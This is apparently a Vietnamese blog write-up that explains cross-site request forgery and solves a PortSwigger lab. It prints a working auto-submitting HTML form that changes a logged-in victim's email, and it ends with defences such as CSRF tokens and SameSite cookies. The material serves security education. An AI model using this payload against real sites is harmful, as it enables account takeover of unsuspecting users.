---
title: "[PortSwigger Lab] - Cross Site Request Forgery"
description: Solution of Cross Site Request Forgery on PortSwigger Lab
date: 2025-06-02 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, csrf]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-02-portswigger-lab-cross-site-request-forgery/csrf.png
    alt: Cross Site Request Forgery
---

## Introduction
---
### What is CSRF?
**CSRF (Cross-site request forgery)** hay giả mạo yêu cầu từ trang chéo là một lỗ hổng bảo mật trên web, cho phép kẻ tấn công lừa người dùng thực hiện các hành động mà họ không mong muốn trên một trang web mà họ đã đăng nhập.
Nó phần nào phá vỡ chính sách cùng nguồn gốc **(same-origin policy)** – vốn được thiết kế để ngăn các trang web khác nhau can thiệp vào nhau.

### Impact of a CSRF attack
Khi **CSRF** thành công, nạn nhân sẽ vô tình thực hiện một hành động nào đó, ví dụ như:
- Thay đổi địa chỉ email trong tài khoản của họ.
- Đổi mật khẩu.
- Thực hiện chuyển khoản tiền.

Nếu hành động đó đủ nghiêm trọng, kẻ tấn công có thể chiếm quyền điều khiển toàn bộ tài khoản của nạn nhân. Nếu nạn nhân là người có quyền cao (admin chẳng hạn), hậu quả có thể là toàn bộ hệ thống bị kiểm soát.

### How CSRF work?
Để CSRF có thể xảy ra, cần có 3 điều kiện chính:
1. Có hành động liên quan: Ví dụ: đổi mật khẩu, thay email, chuyển tiền,… tức là một hành động mà kẻ tấn công muốn "ép" người dùng thực hiện.

2. Xử lý phiên dựa vào **cookie**: Trang web xác định người dùng qua cookie phiên. Không có các cơ chế bảo vệ khác như token xác thực **(CSRF token)**.

3. Không có tham số khó đoán: Nếu URL yêu cầu không chứa thông tin mà kẻ tấn công không biết (ví dụ mật khẩu cũ), thì kẻ tấn công có thể dễ dàng giả mạo yêu cầu.

## Exploit CSRF Lab
Tạo mã khai thác CSRF bằng Burp Suite Pro: Chuột phải → Engagement tools → Generate CSRF PoC.

---
### Lab: CSRF vulnerability with no defenses
- Đăng nhập với tài khoản được cấp
- Update email, gửi request update email tới **repeater**
```http
POST /my-account/change-email HTTP/2
Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
...
email=c%40gmail.com
```
- Tạo mã khai thác CSRF, và thay đổi email 
```html
    <html>
    <body>
        <form action="https://0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
```
- Đến **exploit server**
- Dán mã khai thác vào body 
- Deliver to victim

### 

## Prevent
---
Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn công thường phải vượt qua các biện pháp phòng vệ được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai.
### CSRF Token 
- Là một chuỗi ngẫu nhiên, bí mật và không đoán được được máy chủ tạo ra và gửi cho client (trình duyệt).
- Khi người dùng thực hiện hành động nhạy cảm (ví dụ gửi form), trình duyệt phải gửi lại **CSRF token** đó kèm theo yêu cầu.
- Kẻ tấn công không biết token nên không thể gửi yêu cầu hợp lệ, ngay cả khi có thể ép nạn nhân thực hiện hành động.

### SameSite Cookie
- Là một thuộc tính của **cookie** giúp trình duyệt kiểm soát xem **cookie** có nên được gửi đi hay không trong các **request** giữa các trang web khác nhau **(cross-site request)**.
- Các chế độ
    - **SameSite=Strict:** Cookie chỉ được gửi khi người dùng truy cập trực tiếp (không gửi qua các trang web khác).
    - **SameSite=Lax:** Cookie vẫn được gửi trong một số tình huống thông thường như nhấn link, nhưng không gửi với form POST từ trang khác.
    - **SameSite=None:** Cho phép gửi cookie từ bất kỳ nguồn nào (phải có Secure).
- Kể từ năm 2021, trình duyệt **Chrome** mặc định sử dụng **SameSite=Lax**, giúp giảm thiểu CSRF mà không ảnh hưởng nhiều đến trải nghiệm người dùng.

### Referer (Referer-based validation)
Ứng dụng kiểm tra **header Referer** trong yêu cầu HTTP để xác định xem nó có đến từ chính trang web của mình hay không.
- Nhược điểm:
    - Referer có thể bị chặn hoặc xóa bởi trình duyệt, plugin, hoặc cấu hình bảo mật.
    - Không phải lúc nào cũng đáng tin cậy và dễ bị bỏ qua, vì vậy không nên dùng làm biện pháp duy nhất.

---
Goodluck! 🍀🍀🍀